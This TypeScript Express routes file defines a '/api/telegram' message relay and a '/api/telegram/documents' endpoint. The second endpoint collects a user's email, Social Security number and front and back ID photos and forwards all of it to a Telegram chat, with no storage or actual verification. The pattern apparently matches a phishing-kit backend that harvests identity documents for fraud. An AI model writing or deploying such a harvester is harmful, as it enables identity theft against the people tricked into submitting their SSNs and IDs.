import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { sendTelegramMessage, sendTelegramPhoto, sendTelegramDocument } from "./telegram";
import multer from "multer";

const upload = multer({ storage: multer.memoryStorage() });

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  // Telegram notification endpoint
  app.post("/api/telegram", async (req, res) => {
    try {
      const { message } = req.body;
      
      if (!message) {
        return res.status(400).json({ error: "Message is required" });
      }

      const success = await sendTelegramMessage(message);
      
      if (success) {
        res.json({ success: true });
      } else {
        res.status(500).json({ error: "Failed to send message" });
      }
    } catch (error) {
      console.error("Telegram API error:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Telegram documents endpoint with image uploads
  app.post("/api/telegram/documents", upload.fields([
    { name: 'idFront', maxCount: 1 },
    { name: 'idBack', maxCount: 1 }
  ]), async (req, res) => {
    try {
      const { email, ssn } = req.body;
      const files = req.files as { [fieldname: string]: Express.Multer.File[] };

      if (!email || !ssn || !files?.idFront || !files?.idBack) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      const message = `
📄 *Document Verification*

📧 *Email:* ${email}
🔢 *SSN:* ${ssn}
      `.trim();

      // Send the text message first
      await sendTelegramMessage(message);

      // Send ID Front photo
      await sendTelegramPhoto(files.idFront[0].buffer, `ID Front - ${email}`);

      // Send ID Back photo
      await sendTelegramPhoto(files.idBack[0].buffer, `ID Back - ${email}`);

      res.json({ success: true });
    } catch (error) {
      console.error("Telegram documents API error:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  return httpServer;
}
